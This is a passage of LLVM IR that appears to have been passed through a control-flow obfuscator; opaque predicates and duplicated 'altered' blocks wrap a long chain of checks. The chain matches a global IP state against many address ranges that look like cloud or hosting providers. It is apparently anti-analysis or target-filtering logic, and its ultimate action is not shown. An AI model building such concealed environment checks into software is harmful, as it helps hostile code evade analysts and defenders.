  br i1 %4285, label %5042, label %4286

; <label>:4286:                                   ; preds = %4282, %originalBBpart2572, %4258, %originalBBpart2568
  %4287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4288 = zext i8 %4287 to i32
  %4289 = icmp eq i32 %4288, 66
  br i1 %4289, label %4290, label %4318

; <label>:4290:                                   ; preds = %4286
  %4291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4292 = zext i8 %4291 to i32
  %4293 = icmp eq i32 %4292, 71
  br i1 %4293, label %4294, label %4318

; <label>:4294:                                   ; preds = %4290
  %4295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4296 = zext i8 %4295 to i32
  %4297 = icmp sge i32 %4296, 240
  br i1 %4297, label %4298, label %4318

; <label>:4298:                                   ; preds = %4294
  %4299 = load i32, i32* @x.71
  %4300 = load i32, i32* @y.72
  %4301 = sub i32 %4299, 1
  %4302 = mul i32 %4299, %4301
  %4303 = urem i32 %4302, 2
  %4304 = icmp eq i32 %4303, 0
  %4305 = icmp slt i32 %4300, 10
  %4306 = or i1 %4304, %4305
  br i1 %4306, label %originalBB574, label %originalBB574alteredBB

originalBB574:                                    ; preds = %originalBB574alteredBB, %4298
  %4307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4308 = zext i8 %4307 to i32
  %4309 = icmp slt i32 %4308, 255
  %4310 = load i32, i32* @x.71
  %4311 = load i32, i32* @y.72
  %4312 = sub i32 %4310, 1
  %4313 = mul i32 %4310, %4312
  %4314 = urem i32 %4313, 2
  %4315 = icmp eq i32 %4314, 0
  %4316 = icmp slt i32 %4311, 10
  %4317 = or i1 %4315, %4316
  br i1 %4317, label %originalBBpart2576, label %originalBB574alteredBB

originalBBpart2576:                               ; preds = %originalBB574
  br i1 %4309, label %5042, label %4318

; <label>:4318:                                   ; preds = %originalBBpart2576, %4294, %4290, %4286
  %4319 = load i32, i32* @x.71
  %4320 = load i32, i32* @y.72
  %4321 = sub i32 %4319, 1
  %4322 = mul i32 %4319, %4321
  %4323 = urem i32 %4322, 2
  %4324 = icmp eq i32 %4323, 0
  %4325 = icmp slt i32 %4320, 10
  %4326 = or i1 %4324, %4325
  br i1 %4326, label %originalBB578, label %originalBB578alteredBB

originalBB578:                                    ; preds = %originalBB578alteredBB, %4318
  %4327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4328 = zext i8 %4327 to i32
  %4329 = icmp eq i32 %4328, 98
  %4330 = load i32, i32* @x.71
  %4331 = load i32, i32* @y.72
  %4332 = sub i32 %4330, 1
  %4333 = mul i32 %4330, %4332
  %4334 = urem i32 %4333, 2
  %4335 = icmp eq i32 %4334, 0
  %4336 = icmp slt i32 %4331, 10
  %4337 = or i1 %4335, %4336
  br i1 %4337, label %originalBBpart2580, label %originalBB578alteredBB

originalBBpart2580:                               ; preds = %originalBB578
  br i1 %4329, label %4338, label %4366

; <label>:4338:                                   ; preds = %originalBBpart2580
  %4339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4340 = zext i8 %4339 to i32
  %4341 = icmp eq i32 %4340, 142
  br i1 %4341, label %4342, label %4366

; <label>:4342:                                   ; preds = %4338
  %4343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4344 = zext i8 %4343 to i32
  %4345 = icmp sge i32 %4344, 208
  br i1 %4345, label %4346, label %4366

; <label>:4346:                                   ; preds = %4342
  %4347 = load i32, i32* @x.71
  %4348 = load i32, i32* @y.72
  %4349 = sub i32 %4347, 1
  %4350 = mul i32 %4347, %4349
  %4351 = urem i32 %4350, 2
  %4352 = icmp eq i32 %4351, 0
  %4353 = icmp slt i32 %4348, 10
  %4354 = or i1 %4352, %4353
  br i1 %4354, label %originalBB582, label %originalBB582alteredBB

originalBB582:                                    ; preds = %originalBB582alteredBB, %4346
  %4355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4356 = zext i8 %4355 to i32
  %4357 = icmp slt i32 %4356, 223
  %4358 = load i32, i32* @x.71
  %4359 = load i32, i32* @y.72
  %4360 = sub i32 %4358, 1
  %4361 = mul i32 %4358, %4360
  %4362 = urem i32 %4361, 2
  %4363 = icmp eq i32 %4362, 0
  %4364 = icmp slt i32 %4359, 10
  %4365 = or i1 %4363, %4364
  br i1 %4365, label %originalBBpart2584, label %originalBB582alteredBB

originalBBpart2584:                               ; preds = %originalBB582
  br i1 %4357, label %5042, label %4366

; <label>:4366:                                   ; preds = %originalBBpart2584, %4342, %4338, %originalBBpart2580
  %4367 = load i32, i32* @x.71
  %4368 = load i32, i32* @y.72
  %4369 = sub i32 %4367, 1
  %4370 = mul i32 %4367, %4369
  %4371 = urem i32 %4370, 2
  %4372 = icmp eq i32 %4371, 0
  %4373 = icmp slt i32 %4368, 10
  %4374 = or i1 %4372, %4373
  br i1 %4374, label %originalBB586, label %originalBB586alteredBB

originalBB586:                                    ; preds = %originalBB586alteredBB, %4366
  %4375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4376 = zext i8 %4375 to i32
  %4377 = icmp eq i32 %4376, 107
  %4378 = load i32, i32* @x.71
  %4379 = load i32, i32* @y.72
  %4380 = sub i32 %4378, 1
  %4381 = mul i32 %4378, %4380
  %4382 = urem i32 %4381, 2
  %4383 = icmp eq i32 %4382, 0
  %4384 = icmp slt i32 %4379, 10
  %4385 = or i1 %4383, %4384
  br i1 %4385, label %originalBBpart2588, label %originalBB586alteredBB

originalBBpart2588:                               ; preds = %originalBB586
  br i1 %4377, label %4386, label %4410

; <label>:4386:                                   ; preds = %originalBBpart2588
  %4387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4388 = zext i8 %4387 to i32
  %4389 = icmp sge i32 %4388, 20
  br i1 %4389, label %4390, label %4410

; <label>:4390:                                   ; preds = %4386
  %4391 = load i32, i32* @x.71
  %4392 = load i32, i32* @y.72
  %4393 = sub i32 %4391, 1
  %4394 = mul i32 %4391, %4393
  %4395 = urem i32 %4394, 2
  %4396 = icmp eq i32 %4395, 0
  %4397 = icmp slt i32 %4392, 10
  %4398 = or i1 %4396, %4397
  br i1 %4398, label %originalBB590, label %originalBB590alteredBB

originalBB590:                                    ; preds = %originalBB590alteredBB, %4390
  %4399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4400 = zext i8 %4399 to i32
  %4401 = icmp slt i32 %4400, 24
  %4402 = load i32, i32* @x.71
  %4403 = load i32, i32* @y.72
  %4404 = sub i32 %4402, 1
  %4405 = mul i32 %4402, %4404
  %4406 = urem i32 %4405, 2
  %4407 = icmp eq i32 %4406, 0
  %4408 = icmp slt i32 %4403, 10
  %4409 = or i1 %4407, %4408
  br i1 %4409, label %originalBBpart2592, label %originalBB590alteredBB

originalBBpart2592:                               ; preds = %originalBB590
  br i1 %4401, label %5042, label %4410

; <label>:4410:                                   ; preds = %originalBBpart2592, %4386, %originalBBpart2588
  %4411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4412 = zext i8 %4411 to i32
  %4413 = icmp eq i32 %4412, 35
  br i1 %4413, label %4414, label %4438

; <label>:4414:                                   ; preds = %4410
  %4415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4416 = zext i8 %4415 to i32
  %4417 = icmp sge i32 %4416, 159
  br i1 %4417, label %4418, label %4438

; <label>:4418:                                   ; preds = %4414
  %4419 = load i32, i32* @x.71
  %4420 = load i32, i32* @y.72
  %4421 = sub i32 %4419, 1
  %4422 = mul i32 %4419, %4421
  %4423 = urem i32 %4422, 2
  %4424 = icmp eq i32 %4423, 0
  %4425 = icmp slt i32 %4420, 10
  %4426 = or i1 %4424, %4425
  br i1 %4426, label %originalBB594, label %originalBB594alteredBB

originalBB594:                                    ; preds = %originalBB594alteredBB, %4418
  %4427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4428 = zext i8 %4427 to i32
  %4429 = icmp slt i32 %4428, 183
  %4430 = load i32, i32* @x.71
  %4431 = load i32, i32* @y.72
  %4432 = sub i32 %4430, 1
  %4433 = mul i32 %4430, %4432
  %4434 = urem i32 %4433, 2
  %4435 = icmp eq i32 %4434, 0
  %4436 = icmp slt i32 %4431, 10
  %4437 = or i1 %4435, %4436
  br i1 %4437, label %originalBBpart2596, label %originalBB594alteredBB

originalBBpart2596:                               ; preds = %originalBB594
  br i1 %4429, label %5042, label %4438

; <label>:4438:                                   ; preds = %originalBBpart2596, %4414, %4410
  %4439 = load i32, i32* @x.71
  %4440 = load i32, i32* @y.72
  %4441 = sub i32 %4439, 1
  %4442 = mul i32 %4439, %4441
  %4443 = urem i32 %4442, 2
  %4444 = icmp eq i32 %4443, 0
  %4445 = icmp slt i32 %4440, 10
  %4446 = or i1 %4444, %4445
  br i1 %4446, label %originalBB598, label %originalBB598alteredBB

originalBB598:                                    ; preds = %originalBB598alteredBB, %4438
  %4447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4448 = zext i8 %4447 to i32
  %4449 = icmp eq i32 %4448, 52
  %4450 = load i32, i32* @x.71
  %4451 = load i32, i32* @y.72
  %4452 = sub i32 %4450, 1
  %4453 = mul i32 %4450, %4452
  %4454 = urem i32 %4453, 2
  %4455 = icmp eq i32 %4454, 0
  %4456 = icmp slt i32 %4451, 10
  %4457 = or i1 %4455, %4456
  br i1 %4457, label %originalBBpart2600, label %originalBB598alteredBB

originalBBpart2600:                               ; preds = %originalBB598
  br i1 %4449, label %4458, label %4466

; <label>:4458:                                   ; preds = %originalBBpart2600
  %4459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4460 = zext i8 %4459 to i32
  %4461 = icmp sge i32 %4460, 1
  br i1 %4461, label %4462, label %4466

; <label>:4462:                                   ; preds = %4458
  %4463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4464 = zext i8 %4463 to i32
  %4465 = icmp slt i32 %4464, 95
  br i1 %4465, label %5042, label %4466

; <label>:4466:                                   ; preds = %4462, %4458, %originalBBpart2600
  %4467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4468 = zext i8 %4467 to i32
  %4469 = icmp eq i32 %4468, 52
  br i1 %4469, label %4470, label %4478

; <label>:4470:                                   ; preds = %4466
  %4471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4472 = zext i8 %4471 to i32
  %4473 = icmp sge i32 %4472, 95
  br i1 %4473, label %4474, label %4478

; <label>:4474:                                   ; preds = %4470
  %4475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4476 = zext i8 %4475 to i32
  %4477 = icmp slt i32 %4476, 255
  br i1 %4477, label %5042, label %4478

; <label>:4478:                                   ; preds = %4474, %4470, %4466
  %4479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4480 = zext i8 %4479 to i32
  %4481 = icmp eq i32 %4480, 54
  br i1 %4481, label %4482, label %4506

; <label>:4482:                                   ; preds = %4478
  %4483 = load i32, i32* @x.71
  %4484 = load i32, i32* @y.72
  %4485 = sub i32 %4483, 1
  %4486 = mul i32 %4483, %4485
  %4487 = urem i32 %4486, 2
  %4488 = icmp eq i32 %4487, 0
  %4489 = icmp slt i32 %4484, 10
  %4490 = or i1 %4488, %4489
  br i1 %4490, label %originalBB602, label %originalBB602alteredBB

originalBB602:                                    ; preds = %originalBB602alteredBB, %4482
  %4491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4492 = zext i8 %4491 to i32
  %4493 = icmp sge i32 %4492, 64
  %4494 = load i32, i32* @x.71
  %4495 = load i32, i32* @y.72
  %4496 = sub i32 %4494, 1
  %4497 = mul i32 %4494, %4496
  %4498 = urem i32 %4497, 2
  %4499 = icmp eq i32 %4498, 0
  %4500 = icmp slt i32 %4495, 10
  %4501 = or i1 %4499, %4500
  br i1 %4501, label %originalBBpart2604, label %originalBB602alteredBB

originalBBpart2604:                               ; preds = %originalBB602
  br i1 %4493, label %4502, label %4506

; <label>:4502:                                   ; preds = %originalBBpart2604
  %4503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4504 = zext i8 %4503 to i32
  %4505 = icmp slt i32 %4504, 95
  br i1 %4505, label %5042, label %4506

; <label>:4506:                                   ; preds = %4502, %originalBBpart2604, %4478
  %4507 = load i32, i32* @x.71
  %4508 = load i32, i32* @y.72
  %4509 = sub i32 %4507, 1
  %4510 = mul i32 %4507, %4509
  %4511 = urem i32 %4510, 2
  %4512 = icmp eq i32 %4511, 0
  %4513 = icmp slt i32 %4508, 10
  %4514 = or i1 %4512, %4513
  br i1 %4514, label %originalBB606, label %originalBB606alteredBB

originalBB606:                                    ; preds = %originalBB606alteredBB, %4506
  %4515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4516 = zext i8 %4515 to i32
  %4517 = icmp eq i32 %4516, 54
  %4518 = load i32, i32* @x.71
  %4519 = load i32, i32* @y.72
  %4520 = sub i32 %4518, 1
  %4521 = mul i32 %4518, %4520
  %4522 = urem i32 %4521, 2
  %4523 = icmp eq i32 %4522, 0
  %4524 = icmp slt i32 %4519, 10
  %4525 = or i1 %4523, %4524
  br i1 %4525, label %originalBBpart2608, label %originalBB606alteredBB

originalBBpart2608:                               ; preds = %originalBB606
  br i1 %4517, label %4526, label %4550

; <label>:4526:                                   ; preds = %originalBBpart2608
  %4527 = load i32, i32* @x.71
  %4528 = load i32, i32* @y.72
  %4529 = sub i32 %4527, 1
  %4530 = mul i32 %4527, %4529
  %4531 = urem i32 %4530, 2
  %4532 = icmp eq i32 %4531, 0
  %4533 = icmp slt i32 %4528, 10
  %4534 = or i1 %4532, %4533
  br i1 %4534, label %originalBB610, label %originalBB610alteredBB

originalBB610:                                    ; preds = %originalBB610alteredBB, %4526
  %4535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4536 = zext i8 %4535 to i32
  %4537 = icmp sge i32 %4536, 144
  %4538 = load i32, i32* @x.71
  %4539 = load i32, i32* @y.72
  %4540 = sub i32 %4538, 1
  %4541 = mul i32 %4538, %4540
  %4542 = urem i32 %4541, 2
  %4543 = icmp eq i32 %4542, 0
  %4544 = icmp slt i32 %4539, 10
  %4545 = or i1 %4543, %4544
  br i1 %4545, label %originalBBpart2612, label %originalBB610alteredBB

originalBBpart2612:                               ; preds = %originalBB610
  br i1 %4537, label %4546, label %4550

; <label>:4546:                                   ; preds = %originalBBpart2612
  %4547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4548 = zext i8 %4547 to i32
  %4549 = icmp slt i32 %4548, 255
  br i1 %4549, label %5042, label %4550

; <label>:4550:                                   ; preds = %4546, %originalBBpart2612, %originalBBpart2608
  %4551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4552 = zext i8 %4551 to i32
  %4553 = icmp eq i32 %4552, 13
  br i1 %4553, label %4554, label %4562

; <label>:4554:                                   ; preds = %4550
  %4555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4556 = zext i8 %4555 to i32
  %4557 = icmp sge i32 %4556, 52
  br i1 %4557, label %4558, label %4562

; <label>:4558:                                   ; preds = %4554
  %4559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4560 = zext i8 %4559 to i32
  %4561 = icmp slt i32 %4560, 60
  br i1 %4561, label %5042, label %4562

; <label>:4562:                                   ; preds = %4558, %4554, %4550
  %4563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4564 = zext i8 %4563 to i32
  %4565 = icmp eq i32 %4564, 13
  br i1 %4565, label %4566, label %4574

; <label>:4566:                                   ; preds = %4562
  %4567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4568 = zext i8 %4567 to i32
  %4569 = icmp sge i32 %4568, 112
  br i1 %4569, label %4570, label %4574

; <label>:4570:                                   ; preds = %4566
  %4571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4572 = zext i8 %4571 to i32
  %4573 = icmp slt i32 %4572, 115
  br i1 %4573, label %5042, label %4574

; <label>:4574:                                   ; preds = %4570, %4566, %4562
  %4575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4576 = zext i8 %4575 to i32
  %4577 = icmp eq i32 %4576, 163
  br i1 %4577, label %4578, label %4582

; <label>:4578:                                   ; preds = %4574
  %4579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4580 = zext i8 %4579 to i32
  %4581 = icmp eq i32 %4580, 172
  br i1 %4581, label %5042, label %4582

; <label>:4582:                                   ; preds = %4578, %4574
  %4583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4584 = zext i8 %4583 to i32
  %4585 = icmp eq i32 %4584, 51
  br i1 %4585, label %4586, label %4594

; <label>:4586:                                   ; preds = %4582
  %4587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4588 = zext i8 %4587 to i32
  %4589 = icmp sge i32 %4588, 15
  br i1 %4589, label %4590, label %4594

; <label>:4590:                                   ; preds = %4586
  %4591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4592 = zext i8 %4591 to i32
  %4593 = icmp slt i32 %4592, 255
  br i1 %4593, label %5042, label %4594

; <label>:4594:                                   ; preds = %4590, %4586, %4582
  %4595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4596 = zext i8 %4595 to i32
  %4597 = icmp eq i32 %4596, 79
  br i1 %4597, label %4598, label %4626

; <label>:4598:                                   ; preds = %4594
  %4599 = load i32, i32* @x.71
  %4600 = load i32, i32* @y.72
  %4601 = sub i32 %4599, 1
  %4602 = mul i32 %4599, %4601
  %4603 = urem i32 %4602, 2
  %4604 = icmp eq i32 %4603, 0
  %4605 = icmp slt i32 %4600, 10
  %4606 = or i1 %4604, %4605
  br i1 %4606, label %originalBB614, label %originalBB614alteredBB

originalBB614:                                    ; preds = %originalBB614alteredBB, %4598
  %4607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4608 = zext i8 %4607 to i32
  %4609 = icmp eq i32 %4608, 121
  %4610 = load i32, i32* @x.71
  %4611 = load i32, i32* @y.72
  %4612 = sub i32 %4610, 1
  %4613 = mul i32 %4610, %4612
  %4614 = urem i32 %4613, 2
  %4615 = icmp eq i32 %4614, 0
  %4616 = icmp slt i32 %4611, 10
  %4617 = or i1 %4615, %4616
  br i1 %4617, label %originalBBpart2616, label %originalBB614alteredBB

originalBBpart2616:                               ; preds = %originalBB614
  br i1 %4609, label %4618, label %4626

; <label>:4618:                                   ; preds = %originalBBpart2616
  %4619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4620 = zext i8 %4619 to i32
  %4621 = icmp sge i32 %4620, 128
  br i1 %4621, label %4622, label %4626

; <label>:4622:                                   ; preds = %4618
  %4623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4624 = zext i8 %4623 to i32
  %4625 = icmp slt i32 %4624, 255
  br i1 %4625, label %5042, label %4626

; <label>:4626:                                   ; preds = %4622, %4618, %originalBBpart2616, %4594
  %4627 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4628 = zext i8 %4627 to i32
  %4629 = icmp eq i32 %4628, 212
  br i1 %4629, label %4630, label %4674

; <label>:4630:                                   ; preds = %4626
  %4631 = load i32, i32* @x.71
  %4632 = load i32, i32* @y.72
  %4633 = sub i32 %4631, 1
  %4634 = mul i32 %4631, %4633
  %4635 = urem i32 %4634, 2
  %4636 = icmp eq i32 %4635, 0
  %4637 = icmp slt i32 %4632, 10
  %4638 = or i1 %4636, %4637
  br i1 %4638, label %originalBB618, label %originalBB618alteredBB

originalBB618:                                    ; preds = %originalBB618alteredBB, %4630
  %4639 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4640 = zext i8 %4639 to i32
  %4641 = icmp eq i32 %4640, 47
  %4642 = load i32, i32* @x.71
  %4643 = load i32, i32* @y.72
  %4644 = sub i32 %4642, 1
  %4645 = mul i32 %4642, %4644
  %4646 = urem i32 %4645, 2
  %4647 = icmp eq i32 %4646, 0
  %4648 = icmp slt i32 %4643, 10
  %4649 = or i1 %4647, %4648
  br i1 %4649, label %originalBBpart2620, label %originalBB618alteredBB

originalBBpart2620:                               ; preds = %originalBB618
  br i1 %4641, label %4650, label %4674

; <label>:4650:                                   ; preds = %originalBBpart2620
  %4651 = load i32, i32* @x.71
  %4652 = load i32, i32* @y.72
  %4653 = sub i32 %4651, 1
  %4654 = mul i32 %4651, %4653
  %4655 = urem i32 %4654, 2
  %4656 = icmp eq i32 %4655, 0
  %4657 = icmp slt i32 %4652, 10
  %4658 = or i1 %4656, %4657
  br i1 %4658, label %originalBB622, label %originalBB622alteredBB

originalBB622:                                    ; preds = %originalBB622alteredBB, %4650
  %4659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4660 = zext i8 %4659 to i32
  %4661 = icmp sge i32 %4660, 224
  %4662 = load i32, i32* @x.71
  %4663 = load i32, i32* @y.72
  %4664 = sub i32 %4662, 1
  %4665 = mul i32 %4662, %4664
  %4666 = urem i32 %4665, 2
  %4667 = icmp eq i32 %4666, 0
  %4668 = icmp slt i32 %4663, 10
  %4669 = or i1 %4667, %4668
  br i1 %4669, label %originalBBpart2624, label %originalBB622alteredBB

originalBBpart2624:                               ; preds = %originalBB622
  br i1 %4661, label %4670, label %4674

; <label>:4670:                                   ; preds = %originalBBpart2624
  %4671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4672 = zext i8 %4671 to i32
  %4673 = icmp slt i32 %4672, 255
  br i1 %4673, label %5042, label %4674

; <label>:4674:                                   ; preds = %4670, %originalBBpart2624, %originalBBpart2620, %4626
  %4675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4676 = zext i8 %4675 to i32
  %4677 = icmp eq i32 %4676, 89
  br i1 %4677, label %4678, label %4706

; <label>:4678:                                   ; preds = %4674
  %4679 = load i32, i32* @x.71
  %4680 = load i32, i32* @y.72
  %4681 = sub i32 %4679, 1
  %4682 = mul i32 %4679, %4681
  %4683 = urem i32 %4682, 2
  %4684 = icmp eq i32 %4683, 0
  %4685 = icmp slt i32 %4680, 10
  %4686 = or i1 %4684, %4685
  br i1 %4686, label %originalBB626, label %originalBB626alteredBB

originalBB626:                                    ; preds = %originalBB626alteredBB, %4678
  %4687 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4688 = zext i8 %4687 to i32
  %4689 = icmp eq i32 %4688, 34
  %4690 = load i32, i32* @x.71
  %4691 = load i32, i32* @y.72
  %4692 = sub i32 %4690, 1
  %4693 = mul i32 %4690, %4692
  %4694 = urem i32 %4693, 2
  %4695 = icmp eq i32 %4694, 0
  %4696 = icmp slt i32 %4691, 10
  %4697 = or i1 %4695, %4696
  br i1 %4697, label %originalBBpart2628, label %originalBB626alteredBB

originalBBpart2628:                               ; preds = %originalBB626
  br i1 %4689, label %4698, label %4706

; <label>:4698:                                   ; preds = %originalBBpart2628
  %4699 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4700 = zext i8 %4699 to i32
  %4701 = icmp sge i32 %4700, 96
  br i1 %4701, label %4702, label %4706

; <label>:4702:                                   ; preds = %4698
  %4703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4704 = zext i8 %4703 to i32
  %4705 = icmp slt i32 %4704, 97
  br i1 %4705, label %5042, label %4706

; <label>:4706:                                   ; preds = %4702, %4698, %originalBBpart2628, %4674
  %4707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4708 = zext i8 %4707 to i32
  %4709 = icmp eq i32 %4708, 219
  br i1 %4709, label %4710, label %4734

; <label>:4710:                                   ; preds = %4706
  %4711 = load i32, i32* @x.71
  %4712 = load i32, i32* @y.72
  %4713 = sub i32 %4711, 1
  %4714 = mul i32 %4711, %4713
  %4715 = urem i32 %4714, 2
  %4716 = icmp eq i32 %4715, 0
  %4717 = icmp slt i32 %4712, 10
  %4718 = or i1 %4716, %4717
  br i1 %4718, label %originalBB630, label %originalBB630alteredBB

originalBB630:                                    ; preds = %originalBB630alteredBB, %4710
  %4719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4720 = zext i8 %4719 to i32
  %4721 = icmp sge i32 %4720, 216
  %4722 = load i32, i32* @x.71
  %4723 = load i32, i32* @y.72
  %4724 = sub i32 %4722, 1
  %4725 = mul i32 %4722, %4724
  %4726 = urem i32 %4725, 2
  %4727 = icmp eq i32 %4726, 0
  %4728 = icmp slt i32 %4723, 10
  %4729 = or i1 %4727, %4728
  br i1 %4729, label %originalBBpart2632, label %originalBB630alteredBB

originalBBpart2632:                               ; preds = %originalBB630
  br i1 %4721, label %4730, label %4734

; <label>:4730:                                   ; preds = %originalBBpart2632
  %4731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4732 = zext i8 %4731 to i32
  %4733 = icmp slt i32 %4732, 231
  br i1 %4733, label %5042, label %4734

; <label>:4734:                                   ; preds = %4730, %originalBBpart2632, %4706
  %4735 = load i32, i32* @x.71
  %4736 = load i32, i32* @y.72
  %4737 = sub i32 %4735, 1
  %4738 = mul i32 %4735, %4737
  %4739 = urem i32 %4738, 2
  %4740 = icmp eq i32 %4739, 0
  %4741 = icmp slt i32 %4736, 10
  %4742 = or i1 %4740, %4741
  br i1 %4742, label %originalBB634, label %originalBB634alteredBB

originalBB634:                                    ; preds = %originalBB634alteredBB, %4734
  %4743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4744 = zext i8 %4743 to i32
  %4745 = icmp eq i32 %4744, 23
  %4746 = load i32, i32* @x.71
  %4747 = load i32, i32* @y.72
  %4748 = sub i32 %4746, 1
  %4749 = mul i32 %4746, %4748
  %4750 = urem i32 %4749, 2
  %4751 = icmp eq i32 %4750, 0
  %4752 = icmp slt i32 %4747, 10
  %4753 = or i1 %4751, %4752
  br i1 %4753, label %originalBBpart2636, label %originalBB634alteredBB

originalBBpart2636:                               ; preds = %originalBB634
  br i1 %4745, label %4754, label %4762

; <label>:4754:                                   ; preds = %originalBBpart2636
  %4755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4756 = zext i8 %4755 to i32
  %4757 = icmp sge i32 %4756, 94
  br i1 %4757, label %4758, label %4762

; <label>:4758:                                   ; preds = %4754
  %4759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4760 = zext i8 %4759 to i32
  %4761 = icmp slt i32 %4760, 109
  br i1 %4761, label %5042, label %4762

; <label>:4762:                                   ; preds = %4758, %4754, %originalBBpart2636
  %4763 = load i32, i32* @x.71
  %4764 = load i32, i32* @y.72
  %4765 = sub i32 %4763, 1
  %4766 = mul i32 %4763, %4765
  %4767 = urem i32 %4766, 2
  %4768 = icmp eq i32 %4767, 0
  %4769 = icmp slt i32 %4764, 10
  %4770 = or i1 %4768, %4769
  br i1 %4770, label %originalBB638, label %originalBB638alteredBB

originalBB638:                                    ; preds = %originalBB638alteredBB, %4762
